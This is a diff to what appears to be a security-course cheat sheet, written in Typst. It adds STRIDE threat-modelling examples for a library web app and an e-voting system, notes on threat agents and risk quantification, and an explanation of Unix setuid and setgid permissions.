+  - *T7 (I)*: Read source code via app vuln → No direct OS access
+  - *T8 (D)*: Exhaust storage → N/A (app doesn't write here)
+
+  *Process: University Library Web Application*
+  - *T9 (S)*: Fake server (phishing) → TLS cert from trusted CA (covered)
+  - *T10 (T)*: Modify running app → Java + hardening (covered)
+  - *T11 (R)*: Hide attack traces → Separate log hosts (covered)
+  - *T12 (I)*: SQL injection → Prepared statements + input validation
+  - *T13 (D)*: Crash via malformed input → Accepted risk (not high-availability)
+  - *T14 (E)*: Bypass access control → Authorization checked on every x
+
+  #subinline("E-Voting System")
+  #align(center, image("assets/dfd-example-voting-system.png", width: 60%))
+  *External Entity: Voter*
+  - *T1 (S)*: Impersonate voters (extra votes) → Auth before device issued
+
+  *Data Flow: Register Vote*
+  - *T2 (T)*: Modify wireless vote transmission → Encrypt + sign communication
+  - *T3 (D)*: Block certain votes → Redundant transmission + receipt verification
+
+  *Data Flow: Acknowledge Vote*
+  - *T4 (T)*: Fake "received" ack (vote discarded) → Sign acknowledgments
+
+  *Data Store: Vote Log*
+  - *T5 (T)*: Modify stored votes → Access control + integrity checks
+  - *T6 (I)*: Read votes (enables coercion) → Encrypt stored votes
+
+  *Process: Wireless Voting Device*
+  - *T7 (S)*: Fake device sends manipulated votes → Device auth via certs
+
+  *Process: Voting Computer*
+  - *T8 (T)*: Compromise counting logic → Code signing + integrity checks
+  - *T9 (E)*: Gain admin access → Strong auth + separation of duties
+
   #inline("Threat Agents")
   - *Script Kiddies*: Fun/fame, low skill. Free tools, low-hanging fruit
   - *Insiders*: Revenge/profit, low-med skill. Abuse legitimate access, know protections
-  - *Hacktivists*: Embarrass orgs, low-med skill. DDoS, defacement
+  - *Hacktivists*: Politically motivated, target orgs they oppose. DDoS, defacement, data leaks
   - *Cyber Criminals*: Profit, med-high skill. Phishing, ransomware, botnets
   - *Nation States*: Intelligence, unlimited resources. Specific targets, will do anything
   Key: Criminals pick easy targets, nation states persist until success
@@ -1291,7 +1353,7 @@
   4. *Risk mitigation*: Decide actions, implement corrective measures
 
   #inline("Quantitative vs Qualitative")
-  - *Quantitative*: ALE = SLE x ARO (annual financial loss)
+  - *Quantitative*: ALE (Annualized Loss Expectancy) = SLE x ARO
     - SLE = Single Loss Expectancy (cost per incident)
     - ARO = Annualized Rate of Occurrence (incidents/year)
     - Example: DB breach every 5y, costs 100k → ALE = 100k x 0.2 = 20k/year
@@ -1426,6 +1488,18 @@
   └─ type: - file | d dir | l symlink
   ```
   - *Bits*: `r` read (4) | `w` write (2) | `x` execute (1) | `-` none (0) → sum per group
+
+  #subinline("Setuid / Setgid")
+  - Normal execution: process runs with *your* UID/GID (user who typed the command)
+  - *Setuid* (`s` in owner execute): process runs with *file owner's* UID
+    - `-rwsr-xr-x root root passwd` → anyone executing gets root privileges
+    - Use case: `/usr/bin/passwd` lets normal user modify `/etc/shadow`
+  - *Setgid* (`s` in group execute): process runs with *file's group* GID
+    - `-rwxr-sr-x root mail sendmail` → process runs with `mail` group privileges
+    - Use case: mail program can write to mail spool directory owned by `mail` group
+
+  *Security*: Command injection in setuid-root program = root shell for attacker.
+  Exam example: `-rwxr-xr-x` (no `s`) → no escalation, but still a vulnerability.
 
   #inline("HTTP Status Codes")
   - *2xx Success*: `200` OK | `201` Created | `204` No Content
